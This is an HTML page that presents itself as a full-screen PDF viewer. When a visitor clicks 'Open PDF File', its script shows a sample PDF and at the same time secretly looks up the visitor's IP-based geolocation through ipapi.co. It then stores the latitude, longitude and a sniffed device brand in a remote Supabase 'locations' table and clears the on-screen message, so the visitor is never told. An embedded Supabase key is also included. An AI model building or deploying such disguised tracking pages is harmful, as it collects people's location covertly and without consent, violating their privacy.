<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Full Screen PDF Viewer</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        html,
        body {
            height: 100%;
            margin: 0;
            padding: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #181818;
        }

        #pdf-container {
            width: 100vw;
            height: 100vh;
            display: none;
            align-items: center;
            justify-content: center;
            background: #181818;
            flex-direction: column;
        }

        #location {
            color: #fff;
            font-size: 1.1rem;
            margin-bottom: 12px;
            text-align: center;
            background: rgba(0, 0, 0, 0.4);
            padding: 8px 18px;
            border-radius: 6px;
            max-width: 90vw;
            word-break: break-all;
        }

        iframe {
            width: 100vw;
            height: 100vh;
            border: none;
            background: #fff;
        }

        .fullscreen-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            z-index: 10;
            background: #222;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px 18px;
            font-size: 1rem;
            cursor: pointer;
            opacity: 0.8;
            transition: opacity 0.2s;
            display: none;
        }

        .fullscreen-btn:hover {
            opacity: 1;
        }

        #openFileBtn {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #222;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 18px 32px;
            font-size: 1.2rem;
            cursor: pointer;
            opacity: 0.9;
            transition: opacity 0.2s;
            display: block;
        }

        #openFileBtn:hover {
            opacity: 1;
        }
    </style>
</head>

<body>
    <button id="openFileBtn">Open PDF File</button>
    <button class="fullscreen-btn" id="fullscreenBtn">Full Screen</button>
    <div id="pdf-container">
        <div id="location"></div>
        <iframe id="pdfFrame" src=""></iframe>
    </div>
    <script>
        // Replace with your actual Supabase project URL and anon key
        const SUPABASE_URL = 'https://nqnbuiflrlyosqtxnmwm.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xbmJ1aWZscmx5b3NxdHhubXdtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTI2Mjg2NzUsImV4cCI6MjA2ODIwNDY3NX0.3B1fjKBgL1jtwtzC2C8brGvyuaGGt8pxRtm_G89xdVE';
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        // Device brand detection
        function getDeviceBrand() {
            const ua = navigator.userAgent.toLowerCase();
            if (ua.includes('infinix')) return 'Infinix';
            if (ua.includes('samsung')) return 'Samsung';
            if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('macintosh')) return 'Apple';
            if (ua.includes('huawei')) return 'Huawei';
            if (ua.includes('tecno')) return 'Tecno';
            if (ua.includes('xiaomi') || ua.includes('redmi') || ua.includes('miui')) return 'Xiaomi';
            if (ua.includes('oppo')) return 'Oppo';
            if (ua.includes('vivo')) return 'Vivo';
            if (ua.includes('oneplus')) return 'OnePlus';
            if (ua.includes('nokia')) return 'Nokia';
            if (ua.includes('windows')) return 'Windows PC';
            if (ua.includes('linux')) return 'Linux PC';
            if (ua.includes('android')) return 'Android (Other)';
            return 'Unknown';
        }

        async function saveLocationToSupabase(latitude, longitude) {
            const device_brand = getDeviceBrand();
            const { data, error } = await supabase
                .from('locations')
                .insert([{ latitude, longitude, device_brand }]);
            if (error) {
                console.error('Error saving location:', error);
            } else {
                console.log('Location saved:', data);
            }
        }

        const openFileBtn = document.getElementById('openFileBtn');
        const pdfContainer = document.getElementById('pdf-container');
        const pdfFrame = document.getElementById('pdfFrame');
        const fullscreenBtn = document.getElementById('fullscreenBtn');
        const locationDiv = document.getElementById('location');

        openFileBtn.addEventListener('click', async () => {
            // Show loading message for location
            // locationDiv.textContent = 'Fetching location...';
            pdfFrame.src = 'sample1.pdf';
            pdfContainer.style.display = 'flex';
            fullscreenBtn.style.display = 'block';
            openFileBtn.style.display = 'none';
            try {
                const res = await fetch('https://ipapi.co/json/');
                if (!res.ok) throw new Error('Failed to fetch location');
                const data = await res.json();
                if (data.latitude && data.longitude) {
                    // Save to Supabase
                    saveLocationToSupabase(data.latitude, data.longitude);
                    locationDiv.textContent = '';
                } else {
                    locationDiv.textContent = 'Location unavailable.';
                }
            } catch (e) {
                locationDiv.textContent = 'Could not fetch location.';
            }
        });

        fullscreenBtn.addEventListener('click', () => {
            if (document.fullscreenElement) {
                document.exitFullscreen();
            } else {
                pdfContainer.requestFullscreen();
            }
        });
    </script>
</body>

</html>